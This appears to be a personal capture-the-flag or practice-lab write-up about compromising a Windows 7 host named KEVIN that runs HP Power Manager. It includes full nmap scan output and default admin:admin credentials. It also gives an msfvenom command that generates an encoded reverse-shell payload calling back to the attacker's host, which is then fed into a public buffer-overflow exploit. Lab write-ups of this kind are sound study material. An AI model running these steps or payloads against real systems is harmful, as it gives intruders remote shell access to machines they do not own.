
```
Host is up (0.057s latency).
Not shown: 65445 closed tcp ports (reset), 78 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.154.45/index.asp
| http-methods: 
|_  Supported Methods: GET HEAD
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-12-23T14:14:12+00:00; -8s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2025-12-23T14:14:04+00:00
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-12-22T13:13:37
| Not valid after:  2026-06-23T13:13:37
| MD5:     7d02 57b3 b9a6 da78 d8c8 6303 1425 d897
| SHA-1:   4e22 ab5f c769 a837 73fa 2bb3 d253 e393 8982 64a1
|_SHA-256: 6683 f73d b02d bf3b 4131 2385 ff0d 265a e506 ef7e fb0d 4367 2040 9ea9 b3b0 d243
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-23T14:14:03
|_  start_date: 2025-12-23T13:14:27
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-23T06:14:04-08:00
| nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:80:a1 (VMware)
| Names:
|   KEVIN<00>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   KEVIN<20>            Flags: <unique><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h35m52s, deviation: 3h34m39s, median: -7s

```


![[Pasted image 20251223151423.png]]

i randomly tried the common password and `admin:admin` worked 

after  enum the pages i find out that it is using HP power Management 4,2

![[Pasted image 20251223153041.png]]

found an exploit the confirms our version with buffoverflow so i checked searchsploit for the original exploit

![[Pasted image 20251223153006.png]]
![[Pasted image 20251223155720.png]]
while checking the exploit i noticed the shell was encoded and had badchar searching around i foudn out we can generate using msfvenom a revshell using these badchars

![[Pasted image 20251223155640.png]]


```sh
└─$ msfvenom -p windows/shell_reverse_tcp -b '\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x3d\\x3b\\x2d\\x2c\\x2e\\x24\\x25\\x1a' LHOST=192.168.45.242 LPORT=4444 -e x86/alpha_mixed -f c

```
replace it with the shellcode leave the noobnoob String and done 

![[Pasted image 20251223161951.png]]